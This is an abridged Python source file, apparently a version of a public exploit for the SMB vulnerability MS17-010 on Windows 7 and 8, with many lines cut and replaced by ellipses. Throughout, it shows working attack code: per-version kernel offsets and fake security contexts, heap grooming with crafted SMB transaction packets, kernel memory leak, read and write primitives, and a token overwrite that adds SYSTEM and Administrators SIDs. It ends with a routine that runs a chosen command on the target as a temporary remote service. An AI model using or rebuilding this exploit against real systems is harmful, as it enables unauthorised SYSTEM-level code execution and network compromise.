...
WIN7_64_SESSION_INFO = {
	...
	'FAKE_SECCTX': pack(b'<IIQQIIB', 0x28022a, 1, 0, 0, 2, 0, 1),
	'SECCTX_SIZE': 0x28,
}
...
WIN7_32_SESSION_INFO = {
	...
	'FAKE_SECCTX': pack(b'<IIIIIIB', 0x1c022a, 1, 0, 0, 2, 0, 1),
	'SECCTX_SIZE': 0x1c,
}
...
WIN8_64_SESSION_INFO = {
	...
	'FAKE_SECCTX': pack(b'<IIQQQQIIB', 0x38022a, 1, 0, 0, 0, 0, 2, 0, 1),
	'SECCTX_SIZE': 0x38,
}
...
WIN8_32_SESSION_INFO = {
	...
	'FAKE_SECCTX': pack(b'<IIIIIIIIB', 0x24022a, 1, 0, 0, 0, 0, 2, 0, 1),
	'SECCTX_SIZE': 0x24,
}
...
def leak_frag_size(conn, tid, fid):
	...
	mid = conn.next_mid()
	req1 = conn.create_nt_trans_packet(5, param=pack(b'<HH', fid, 0), mid=mid, data=b'A'*0x10d0, maxParameterCount=GROOM_TRANS_SIZE-0x10d0-TRANS_NAME_LEN)
...
def read_data(conn, info, read_addr, read_size):
	...
	new_data = pack(b'<'+fmt*3, info['trans2_addr']+info['TRANS_FLINK_OFFSET'], info['trans2_addr']+0x200, read_addr)  # OutParameter, InData, OutData
	new_data += pack(b'<II', 0, 0)  # SetupCount, MaxSetupCount
	new_data += pack(b'<III', 8, 8, 8)  # ParamterCount, TotalParamterCount, MaxParameterCount
	new_data += pack(b'<III', read_size, read_size, read_size)  # DataCount, TotalDataCount, MaxDataCount
	new_data += pack(b'<HH', 0, 5)  # Category, Function (NT_RENAME)
	...
	conn.send_nt_trans(5, param=pack(b'<HH', info['fid'], 0), totalDataCount=0x4300-0x20, totalParameterCount=0x1000)
	...
	info['trans2_addr'] = unpack_from(b'<'+fmt, read_data)[0] - info['TRANS_FLINK_OFFSET']

	# set trans1.InData to &trans2
	conn.send_nt_trans_secondary(mid=info['trans1_mid'], param=pack(b'<'+fmt, info['trans2_addr']), paramDisplacement=info['TRANS_INDATA_OFFSET'])
	wait_for_request_processed(conn)

	# modify trans2 mid
	conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=pack(b'<H', info['trans2_mid']), dataDisplacement=info['TRANS_MID_OFFSET'])
	wait_for_request_processed(conn)
...
def write_data(conn, info, write_addr, write_data):
	# trans2.InData
	conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=pack(b'<'+info['PTR_FMT'], write_addr), dataDisplacement=info['TRANS_INDATA_OFFSET'])
	wait_for_request_processed(conn)
...
def align_transaction_and_leak(conn, tid, fid, info, numFill=4):
	trans_param = pack(b'<HH', fid, 0)  # param for NT_RENAME
	...
	expected_size = pack(b'<H', info['BRIDE_TRANS_SIZE'])
	...
	ptrf = info['PTR_FMT']
	_, connection_addr, session_addr, treeconnect_addr, flink_value = unpack_from(b'<'+ptrf*5, leakTrans, 8)
	inparam_value = unpack_from(b'<'+ptrf, leakTrans, info['TRANS_INPARAM_OFFSET'])[0]
	leak_mid = unpack_from(b'<H', leakTrans, info['TRANS_MID_OFFSET'])[0]
...
def exploit_matched_pairs(conn, pipe_name, info):
	...
	recvPkt = conn.send_nt_trans(5, mid=special_mid, param=pack(b'<HH', fid, 0), data='')
	...
	conn.send_nt_trans_secondary(mid=fid, data=pack(b'<'+fmt, info['trans1_addr']), dataDisplacement=indata_next_trans_displacement + info['TRANS_INDATA_OFFSET'])
	wait_for_request_processed(conn)
	...
	conn.send_nt_trans_secondary(mid=special_mid, data=pack(b'<'+fmt*3, info['trans1_addr'], info['trans1_addr']+0x200, info['trans2_addr']), dataDisplacement=info['TRANS_INPARAM_OFFSET'])
	wait_for_request_processed(conn)
...
def exploit_fish_barrel(conn, pipe_name, info):
	...
	print('Groom packets')
	trans_param = pack(b'<HH', info['fid'], 0)
	for i in range(12):
		mid = info['fid'] if i == 8 else next_extra_mid()
		conn.send_trans(b'', mid=mid, param=trans_param, totalParameterCount=0x100-TRANS_NAME_LEN, totalDataCount=0xec0, maxParameterCount=0x40, maxDataCount=0)
	...
	for tinfo in attempt_list:
		...
		# if the overwritten is correct, a modified transaction mid should be special_mid now.
		# a new transaction with special_mid should be error.
		recvPkt = conn.send_nt_trans(5, mid=special_mid, param=trans_param, data=b'')
		if recvPkt.getNTStatus() == 0x10002:  # invalid SMB
	...
	conn.send_trans_secondary(mid=info['fid'], data=pack(b'<IIIII', 4, 4, 4, 0x100, 0x100), dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_PARAMCNT_OFFSET'])
	...
	if unpack_from(b'<H', leakData, HEAP_CHUNK_PAD_SIZE)[0] != (TRANS_CHUNK_SIZE // info['POOL_ALIGN']):
	...
	fmt = info['PTR_FMT']
	_, connection_addr, session_addr, treeconnect_addr, flink_value = unpack_from(b'<'+fmt*5, leakTrans, 8)
	inparam_value, outparam_value, indata_value = unpack_from(b'<'+fmt*3, leakTrans, info['TRANS_INPARAM_OFFSET'])
	trans2_mid = unpack_from(b'<H', leakTrans, info['TRANS_MID_OFFSET'])[0]
	...
	conn.send_nt_trans_secondary(mid=info['fid'], param=pack(b'<'+fmt*3, trans1_addr, trans1_addr+0x200, trans2_addr), paramDisplacement=TRANS_OFFSET+info['TRANS_INPARAM_OFFSET'])
	wait_for_request_processed(conn)

	# modify trans1.mid
	trans1_mid = conn.next_mid()
	conn.send_trans_secondary(mid=info['fid'], param=pack(b'<H', trans1_mid), paramDisplacement=info['TRANS_MID_OFFSET'])
	wait_for_request_processed(conn)
...
def create_fake_SYSTEM_UserAndGroups(conn, info, userAndGroupCount, userAndGroupsAddr):
	SID_SYSTEM = pack(b'<BB5xB'+b'I', 1, 1, 5, 18)
	SID_ADMINISTRATORS = pack(b'<BB5xB'+b'II', 1, 2, 5, 32, 544)
	SID_AUTHENICATED_USERS = pack(b'<BB5xB'+b'I', 1, 1, 5, 11)
	SID_EVERYONE = pack(b'<BB5xB'+b'I', 1, 1, 1, 0)
	...
	for sid, attr in zip(sids[:fakeUserAndGroupCount], attrs[:fakeUserAndGroupCount]):
		fakeUserAndGroups += pack(b'<'+info['PTR_FMT']*2, addr, attr)
		addr += len(sid)
...
def exploit(target, pipe_name):
	...
	if pipe_name is None:
		...
		if pipe_name is None:
			...
			return False
		print(f'Using named pipe: {pipe_name}')
	...
	secCtxAddr = unpack_from(b'<'+fmt, sessionData, info['SESSION_SECCTX_OFFSET'])[0]
	...
	if 'PCTXTHANDLE_TOKEN_OFFSET' in info:
		...
		userAndGroupCount = unpack_from(b'<I', tokenData, info['TOKEN_USER_GROUP_CNT_OFFSET'])[0]
		userAndGroupsAddr = unpack_from(b'<'+fmt, tokenData, info['TOKEN_USER_GROUP_ADDR_OFFSET'])[0]
		...
		if fakeUserAndGroupCount != userAndGroupCount:
			write_data(conn, info, tokenAddr+info['TOKEN_USER_GROUP_CNT_OFFSET'], pack(b'<I', fakeUserAndGroupCount))
	...
	if 'PCTXTHANDLE_TOKEN_OFFSET' in info:
		...
		if fakeUserAndGroupCount != userAndGroupCount:
			write_data(conn, info, tokenAddr+info['TOKEN_USER_GROUP_CNT_OFFSET'], pack(b'<I', userAndGroupCount))
	else:
...
def service_exec(conn, cmd):
	...
	service_name = b''.join([random.choice(string.ascii_letters).encode() for i in range(4)])
	...
	svcHandle = None
	try:
		print(f"Opening SVCManager on {conn.get_remote_host()}.....")
		resp = scmr.hROpenSCManagerW(rpcsvc)
		svcHandle = resp['lpScHandle']

		# First we try to open the service in case it exists. If it does, we remove it.
		try:
			resp = scmr.hROpenServiceW(rpcsvc, svcHandle, service_name.decode() + '\x00')
		...
		print(f'Creating service {service_name.decode()}.....')
		resp = scmr.hRCreateServiceW(rpcsvc, svcHandle, service_name.decode() + '\x00', service_name.decode() + '\x00', lpBinaryPathName=cmd + '\x00')
		serviceHandle = resp['lpServiceHandle']

		if serviceHandle:
			# Start service
			try:
				print(f'Starting service {service_name.decode()}.....')
			...
			print(f'Removing service {service_name.decode()}.....')
			scmr.hRDeleteService(rpcsvc, serviceHandle)
			scmr.hRCloseServiceHandle(rpcsvc, serviceHandle)
	except Exception as e:
		print(f"ServiceExec Error on: {conn.get_remote_host()}")
		print(str(e))
	finally:
		if svcHandle:
